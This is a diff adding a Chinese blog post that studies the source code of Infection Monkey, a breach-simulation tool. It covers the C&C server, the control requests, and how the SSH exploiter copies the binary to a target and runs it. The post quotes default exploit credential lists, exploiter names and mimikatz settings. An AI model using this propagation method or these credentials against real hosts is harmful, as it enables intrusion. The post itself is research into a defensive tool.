@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #199475; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #0B6E48, 0 0 5px     #0B6E48; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #044D22;    /*上边框颜色*/
+        border-left-color: #044D22;    /*左边框颜色*/
+    }
+</style>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/trojan_32px_573178_easyicon.net.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/trojan_16px_573178_easyicon.net.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="botnet," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Infection Monkey是一款由以色列安全公司GuardiCore在2016黑帽大会上发布的数据中心安全检测工具，其主要用于数据中心边界及内部服务器安全性的自动化检测。该工具在架构上，则分为Monkey（扫描及漏洞利用端）以及C&amp;amp;C服务器（相当于reporter，但仅仅只是用于收集monkey探测的信息）">
+<meta name="keywords" content="botnet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="infection monkey源码研究">
+<meta property="og:url" content="http://yoursite.com/2019/04/21/[botnet检测]monkey研究/index.html">
+<meta property="og:site_name" content="metang&#39;s blog">
+<meta property="og:description" content="Infection Monkey是一款由以色列安全公司GuardiCore在2016黑帽大会上发布的数据中心安全检测工具，其主要用于数据中心边界及内部服务器安全性的自动化检测。该工具在架构上，则分为Monkey（扫描及漏洞利用端）以及C&amp;amp;C服务器（相当于reporter，但仅仅只是用于收集monkey探测的信息）">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-04-21T02:42:06.078Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="infection monkey源码研究">
+<meta name="twitter:description" content="Infection Monkey是一款由以色列安全公司GuardiCore在2016黑帽大会上发布的数据中心安全检测工具，其主要用于数据中心边界及内部服务器安全性的自动化检测。该工具在架构上，则分为Monkey（扫描及漏洞利用端）以及C&amp;amp;C服务器（相当于reporter，但仅仅只是用于收集monkey探测的信息）">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'TZVHEBFK02',
+      apiKey: '1ab48ccb78c0b1c98cf0e7935807338f',
+      indexName: 'my_blog',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键字进行搜索","hits_empty":"找不到关于  ${query} 的文章","hits_stats":"共找到 ${hits} 篇文章，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/21/[botnet检测]monkey研究/"/>
+
+
+
+
+
+  <title>infection monkey源码研究 | metang's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/metang326"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/e7bbb0521b397edbd5fe43e7f760759336b5e05f/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677265656e5f3030373230302e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_green_007200.png"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">metang's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">In case I don't see ya', good afternoon, good evening and goodnight.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/21/[botnet检测]monkey研究/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="metang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="metang's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">infection monkey源码研究</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-21T00:00:00+08:00">
+                2019-04-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/botnet检测/" itemprop="url" rel="index">
+                    <span itemprop="name">botnet检测</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,351
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Infection Monkey是一款由以色列安全公司GuardiCore在2016黑帽大会上发布的数据中心安全检测工具，其主要用于数据中心边界及内部服务器安全性的自动化检测。该工具在架构上，则分为Monkey（扫描及漏洞利用端）以及C&amp;C服务器（相当于reporter，但仅仅只是用于收集monkey探测的信息）</p>
+<a id="more"></a>
+<h1 id="monkey-island"><a href="#monkey-island" class="headerlink" title="monkey_island"></a>monkey_island</h1><h2 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h2><p>入口：run.sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line"></div><div class="line">cd /var/monkey_island/cc</div><div class="line">/var/monkey_island/bin/mongodb/bin/mongod --quiet --dbpath /var/monkey_island/db &amp;</div><div class="line">/var/monkey_island/bin/python/bin/python main.py</div></pre></td></tr></table></figure>
+<p>这里会跳转到 /var/monkey_island/cc目录下</p>
+<p>然后运行cc/main.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    print(<span class="string">"\nin main.py"</span>)</div><div class="line">    <span class="keyword">from</span> tornado.wsgi <span class="keyword">import</span> WSGIContainer</div><div class="line">    <span class="keyword">from</span> tornado.httpserver <span class="keyword">import</span> HTTPServer</div><div class="line">    <span class="keyword">from</span> tornado.ioloop <span class="keyword">import</span> IOLoop</div><div class="line"></div><div class="line">    mongo_url = os.environ.get(<span class="string">'MONGO_URL'</span>, env.get_mongo_url())</div><div class="line"></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> is_db_server_up(mongo_url):</div><div class="line">        print(<span class="string">'Waiting for MongoDB server'</span>)</div><div class="line">        time.sleep(<span class="number">1</span>)    </div><div class="line">    app = init_app(mongo_url)</div><div class="line">    <span class="keyword">if</span> env.is_debug():</div><div class="line">        app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="keyword">True</span>, ssl_context=(<span class="string">'server.crt'</span>, <span class="string">'server.key'</span>))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        http_server = HTTPServer(WSGIContainer(app),</div><div class="line">                                 ssl_options=&#123;<span class="string">'certfile'</span>: os.environ.get(<span class="string">'SERVER_CRT'</span>, <span class="string">'server.crt'</span>),</div><div class="line">                                              <span class="string">'keyfile'</span>: os.environ.get(<span class="string">'SERVER_KEY'</span>, <span class="string">'server.key'</span>)&#125;)</div><div class="line">        http_server.listen(env.get_island_port())</div><div class="line">        print(<span class="string">'Monkey Island Server is running on https://&#123;&#125;:&#123;&#125;'</span>.format(local_ip_addresses()[<span class="number">0</span>], env.get_island_port()))</div><div class="line">        IOLoop.instance().start()</div></pre></td></tr></table></figure>
+<p>IOLoop.instance().start()一般就是放在main函数末尾的</p>
+<p>目前的感觉：monkey island这部分是通过mongo数据库和monkey进行交流的。</p>
+<p>monkey是怎么知道island地址的？是通过运行的时候附加的ip地址参数知道的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClientRun</span><span class="params">(flask_restful.Resource)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></div><div class="line">        client_ip = request.remote_addr</div><div class="line">        <span class="keyword">if</span> client_ip == <span class="string">"127.0.0.1"</span>:</div><div class="line">            monkey = NodeService.get_monkey_island_monkey()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            monkey = NodeService.get_monkey_by_ip(client_ip)</div><div class="line">        NodeService.update_dead_monkeys()</div><div class="line">        <span class="keyword">if</span> monkey <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            is_monkey_running = <span class="keyword">not</span> monkey[<span class="string">"dead"</span>]</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            is_monkey_running = <span class="keyword">False</span></div><div class="line"></div><div class="line">        <span class="keyword">return</span> jsonify(is_running=is_monkey_running)</div></pre></td></tr></table></figure>
+<p>当在island本机运行monkey时，将binaries/monkey-linux-64复制到了：/var/monkey_island/cc/</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">body.get(&apos;action&apos;) == &apos;run&apos;</div><div class="line">in run_local_monkey function!</div><div class="line">(&apos;copying monkey_path:&apos;, &apos;binaries/monkey-linux-64&apos;, &apos;target_path:&apos;, &apos;/var/monkey_island/cc/monkey-linux-64&apos;)</div><div class="line">(&apos;run monkey:args=&apos;, [u&apos;&quot;/var/monkey_island/cc/monkey-linux-64&quot; m0nk3y -s 192.168.2.136:5000&apos;])</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Config file wasn<span class="string">'t supplied and default path: /var/monkey_island/cc/monkey.bin wasn'</span>t found, using internal default</div><div class="line">Loaded Configuration: &#123;<span class="string">'ms08_067_remote_user_add'</span>: <span class="string">'Monkey_IUSER_SUPPORT'</span>, <span class="string">'collect_system_info'</span>: <span class="keyword">True</span>, <span class="string">'exploit_ntlm_hash_list'</span>: [], <span class="string">'monkey_log_path_linux'</span>: <span class="string">'/tmp/user-1563'</span>, <span class="string">'alive'</span>: <span class="keyword">True</span>, <span class="string">'singleton_mutex_name'</span>: <span class="string">'&#123;2384ec59-0df8-4ab9-918c-843740924a28&#125;'</span>, <span class="string">'scanner_class'</span>: <span class="string">'TcpScanner'</span>, <span class="string">'tcp_target_ports'</span>: [<span class="number">22</span>, <span class="number">2222</span>, <span class="number">445</span>, <span class="number">135</span>, <span class="number">3389</span>, <span class="number">80</span>, <span class="number">8080</span>, <span class="number">443</span>, <span class="number">8008</span>, <span class="number">3306</span>, <span class="number">9200</span>, <span class="number">80</span>, <span class="number">8080</span>, <span class="number">443</span>, <span class="number">8008</span>], <span class="string">'ping_scan_timeout'</span>: <span class="number">1000</span>, <span class="string">'ms08_067_exploit_attempts'</span>: <span class="number">5</span>, <span class="string">'send_log_to_server'</span>: <span class="keyword">True</span>, <span class="string">'dropper_target_path_win_64'</span>: <span class="string">'C:\\Windows\\monkey64.exe'</span>, <span class="string">'max_iterations'</span>: <span class="number">1</span>, <span class="string">'keep_tunnel_open_time'</span>: <span class="number">60</span>, <span class="string">'sambacry_shares_not_to_check'</span>: [<span class="string">'IPC$'</span>, <span class="string">'print$'</span>], <span class="string">'kill_file_path_linux'</span>: <span class="string">'/var/run/monkey.not'</span>, <span class="string">'serialize_config'</span>: <span class="keyword">False</span>, <span class="string">'tcp_scan_interval'</span>: <span class="number">200</span>, <span class="string">'timeout_between_iterations'</span>: <span class="number">100</span>, <span class="string">'HTTP_PORTS'</span>: [<span class="number">80</span>, <span class="number">8080</span>, <span class="number">443</span>, <span class="number">8008</span>], <span class="string">'dropper_set_date'</span>: <span class="keyword">True</span>, <span class="string">'sambacry_folder_paths_to_guess'</span>: [<span class="string">'/'</span>, <span class="string">'/mnt'</span>, <span class="string">'/tmp'</span>, <span class="string">'/storage'</span>, <span class="string">'/export'</span>, <span class="string">'/share'</span>, <span class="string">'/shares'</span>, <span class="string">'/home'</span>], <span class="string">'ms08_067_remote_user_pass'</span>: <span class="string">'Password1!'</span>, <span class="string">'skip_exploit_if_file_exist'</span>: <span class="keyword">False</span>, <span class="string">'self_delete_in_cleanup'</span>: <span class="keyword">False</span>, <span class="string">'retry_failed_explotation'</span>: <span class="keyword">True</span>, <span class="string">'smb_service_name'</span>: <span class="string">'InfectionMonkey'</span>, <span class="string">'exploit_password_list'</span>: [<span class="string">'Password1!'</span>, <span class="string">'1234'</span>, <span class="string">'password'</span>, <span class="string">'12345678'</span>], <span class="string">'dropper_target_path_win_32'</span>: <span class="string">'C:\\Windows\\monkey32.exe'</span>, <span class="string">'victims_max_exploit'</span>: <span class="number">7</span>, <span class="string">'exploit_user_list'</span>: [<span class="string">'Administrator'</span>, <span class="string">'root'</span>, <span class="string">'user'</span>], <span class="string">'dropper_date_reference_path_linux'</span>: <span class="string">'/bin/sh'</span>, <span class="string">'local_network_scan'</span>: <span class="keyword">True</span>, <span class="string">'dropper_log_path_windows'</span>: <span class="string">'%temp%\\~df1562.tmp'</span>, <span class="string">'dropper_log_path_linux'</span>: <span class="string">'/tmp/user-1562'</span>, <span class="string">'smb_download_timeout'</span>: <span class="number">300</span>, <span class="string">'rdp_use_vbs_download'</span>: <span class="keyword">True</span>, <span class="string">'extract_azure_creds'</span>: <span class="keyword">True</span>, <span class="string">'finger_classes'</span>: [<span class="string">'SMBFinger'</span>, <span class="string">'SSHFinger'</span>, <span class="string">'PingScanner'</span>, <span class="string">'HTTPFinger'</span>, <span class="string">'MySQLFinger'</span>, <span class="string">'ElasticFinger'</span>], <span class="string">'dropper_target_path_linux'</span>: <span class="string">'/tmp/monkey'</span>, <span class="string">'victims_max_find'</span>: <span class="number">30</span>, <span class="string">'dropper_try_move_first'</span>: <span class="keyword">True</span>, <span class="string">'tcp_scan_timeout'</span>: <span class="number">3000</span>, <span class="string">'dropper_date_reference_path_windows'</span>: <span class="string">'%windir%\\system32\\kernel32.dll'</span>, <span class="string">'exploit_lm_hash_list'</span>: [], <span class="string">'blocked_ips'</span>: [<span class="string">''</span>], <span class="string">'kill_file_path_windows'</span>: <span class="string">'%windir%\\monkey.not'</span>, <span class="string">'exploiter_classes'</span>: [<span class="string">'SmbExploiter'</span>, <span class="string">'WmiExploiter'</span>, <span class="string">'SSHExploiter'</span>, <span class="string">'ShellShockExploiter'</span>, <span class="string">'SambaCryExploiter'</span>, <span class="string">'ElasticGroovyExploiter'</span>], <span class="string">'command_servers'</span>: [<span class="string">'41.50.73.31:5000'</span>], <span class="string">'monkey_log_path_windows'</span>: <span class="string">'%temp%\\~df1563.tmp'</span>, <span class="string">'tcp_scan_get_banner'</span>: <span class="keyword">True</span>, <span class="string">'internet_services'</span>: [<span class="string">'monkey.guardicore.com'</span>, <span class="string">'www.google.com'</span>], <span class="string">'depth'</span>: <span class="number">2</span>, <span class="string">'sambacry_trigger_timeout'</span>: <span class="number">5</span>, <span class="string">'subnet_scan_list'</span>: [<span class="string">''</span>], <span class="string">'use_file_logging'</span>: <span class="keyword">True</span>, <span class="string">'current_server'</span>: <span class="string">''</span>, <span class="string">'mimikatz_dll_name'</span>: <span class="string">'mk.dll'</span>&#125;</div></pre></td></tr></table></figure>
+<p>Config file wasn’t supplied and default path: /var/monkey_island/cc/monkey.bin wasn’t found, using internal default<br>Loaded Configuration….这些都不是island代码里出现过的，应该就是monkey-linux-64内置的。</p>
+<p>对其他monkey的操作 比如 kill ,也是通过更新数据库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill_all</span><span class="params">()</span>:</span></div><div class="line">    mongo.db.monkey.update(&#123;<span class="string">'dead'</span>: <span class="keyword">False</span>&#125;, &#123;<span class="string">'$set'</span>: &#123;<span class="string">'config.alive'</span>: <span class="keyword">False</span>, <span class="string">'modifytime'</span>: datetime.now()&#125;&#125;,</div><div class="line">                           upsert=<span class="keyword">False</span>,</div><div class="line">                           multi=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">return</span> jsonify(status=<span class="string">'OK'</span>)</div></pre></td></tr></table></figure>
+<h1 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h1><h2 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h2><p><strong>main.py</strong></p>
+<p>如果存在了配置文件，就使用他；如果不存在则使用内置的默认配置。</p>
+<p>然后检查一下是否存在kill file，如果有的话就不运行了。</p>
+<p>接着初始化monkey </p>
+<h3 id="MONKEY-ARG-则-monkey-cls-InfectionMonkey"><a href="#MONKEY-ARG-则-monkey-cls-InfectionMonkey" class="headerlink" title="MONKEY_ARG 则 monkey_cls = InfectionMonkey"></a>MONKEY_ARG 则 monkey_cls = InfectionMonkey</h3><p>初始化InfectionMonkey这个类：增加server地址 WormConfiguration.command_servers.insert(0, self._default_server)</p>
+<p>然后执行monkey.start  对ControlClient进行了一些操作，monkey_tunnel = ControlClient.create_control_tunnel()，monkey_tunnel.start() 然后开始扫了</p>
+<p>LOG</p>
+<p>monkey_tunnel</p>
+<p>最后还会send_log_to_server</p>
+<h3 id="DROPPER-ARG-则-monkey-cls-MonkeyDrops"><a href="#DROPPER-ARG-则-monkey-cls-MonkeyDrops" class="headerlink" title="DROPPER_ARG  则 monkey_cls = MonkeyDrops"></a>DROPPER_ARG  则 monkey_cls = MonkeyDrops</h3><p>当路径不同的时候会把文件copy/move</p>
+<p>然后开始运行monkey</p>
+<h3 id="control-py"><a href="#control-py" class="headerlink" title="control.py"></a>control.py</h3><p>wakeup函数：</p>
+<pre><code>requests.post(&quot;https://%s/api/monkey&quot; % (WormConfiguration.current_server,),
+              data=json.dumps(monkey),
+              headers={&apos;content-type&apos;: &apos;application/json&apos;},
+              verify=False,
+              proxies=ControlClient.proxies,
+              timeout=20)
+</code></pre><p>find_server函数：</p>
+<p>[10916:DEBUG] control.find_server.72: Trying to connect to server: 192.168.2.136:5000</p>
+<pre><code>LOG.debug(&quot;Trying to wake up with Monkey Island servers list: %r&quot; % WormConfiguration.command_servers)
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">LOG.debug(&quot;Trying to wake up with Monkey Island servers list: %r&quot; % WormConfiguration.command_servers)</div><div class="line">requests.get(&quot;https://%s/api?action=is-up&quot; % (server,),</div><div class="line">                             verify=False,</div><div class="line">                             proxies=ControlClient.proxies,</div><div class="line">                             timeout=TIMEOUT)</div></pre></td></tr></table></figure>
+<p>send_telemetry和send_log 都是通过requests.post</p>
+<p>load_control_config通过requests.get</p>
+<p>send_config_error通过requests.patch</p>
+<p><strong>download_monkey_exe_by_filename</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">download = requests.get(&quot;https://%s/api/monkey/download/%s&quot; %</div><div class="line">                                        (WormConfiguration.current_server, filename),</div><div class="line">                                        verify=False,</div><div class="line">                                        proxies=ControlClient.proxies)</div></pre></td></tr></table></figure>
+<p>这部分就和island上想在其他机器上运行monkey的话 需要执行的步骤一样的。</p>
+<p> def download_monkey_exe_by_filename(filename, size):</p>
+<p>class MonkeyDrops(object):  运行本地的monkey了</p>
+<p>monkey_process = subprocess.Popen(monkey_cmdline, shell=True,<br>  129                                            stdin=None, stdout=None, stderr=None,<br>  130                                            close_fds=True, creationflags=DETACHED_PROCESS)</p>
+<p>monkey/infection_monkey/exploit/tools.py:</p>
+<p> Create http server for file transfer with a lock</p>
+<h3 id="exploit-sshexec-py"><a href="#exploit-sshexec-py" class="headerlink" title="exploit/sshexec.py"></a>exploit/sshexec.py</h3><p>exploit_host函数：</p>
+<p><strong>ssh = paramiko.SSHClient()</strong>   paramiko实现了SSH协议，能够方便地与远程计算机交互</p>
+<p>尝试ssh攻击 成功之后使用ssh.exec_command(‘uname -o’)获取目标主机的os，之后查看dropper_target_path_linux这个路径的moneky文件是否已经存在了，存在的话就说明这个机器已经被感染了 可以退出了。</p>
+<p>不存在的话，就get_target_monkey查找src_path，然后<strong>ftp = ssh.open_sftp()</strong> 把src_path路径的文件传过去：</p>
+<p>with monkeyfs.open(src_path) as file_obj:</p>
+<pre><code>ftp.putfo(file_obj, self._config.dropper_target_path_linux, file_size=monkeyfs.getsize(src_path),
+</code></pre><p>​                          callback=self.log_transfer)<br>​                ftp.chmod(self._config.dropper_target_path_linux, 0o777)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">putfo(fl, remotepath, file_size=<span class="number">0</span>, callback=<span class="keyword">None</span>, confirm=<span class="keyword">True</span>)</div><div class="line">Copy the contents of an open file object (fl) to the SFTP server <span class="keyword">as</span> remotepath. Any exception raised by operations will be passed through.</div><div class="line"></div><div class="line">The SFTP operations use pipelining <span class="keyword">for</span> speed.</div><div class="line"></div><div class="line">Parameters:	</div><div class="line">fl – opened file <span class="keyword">or</span> file-like object to copy</div><div class="line">remotepath (str) – the destination path on the SFTP server</div><div class="line">file_size (int) – optional size parameter passed to callback. If none <span class="keyword">is</span> specified, size defaults to <span class="number">0</span></div><div class="line">callback (callable) – optional callback function (form: func(int, int)) that accepts the bytes transferred so far <span class="keyword">and</span> the total bytes to be transferred (since <span class="number">1.7</span><span class="number">.4</span>)</div><div class="line">confirm (bool) – whether to do a stat() on the file afterwards to confirm the file size (since <span class="number">1.7</span><span class="number">.7</span>)</div><div class="line">Returns:	</div><div class="line">an SFTPAttributes object containing attributes about the given file.</div></pre></td></tr></table></figure>
+<p>然后通过ssh.exec_command(cmdline)在被感染机器运行monkey</p>
+
+      
+    </div>
+    
+    
+    
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="metang 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="metang 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/botnet/" rel="tag"><i class="fa fa-tag"></i> botnet</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/21/[botnet检测]infection monkey笔记/" rel="next" title="infection monkey的安装部署及使用">
+                <i class="fa fa-chevron-left"></i> infection monkey的安装部署及使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/21/[日志分析]audit监控进程/" rel="prev" title="audit监控进程的使用">
+                audit监控进程的使用 <i class="fa fa-chevron-right"></i>
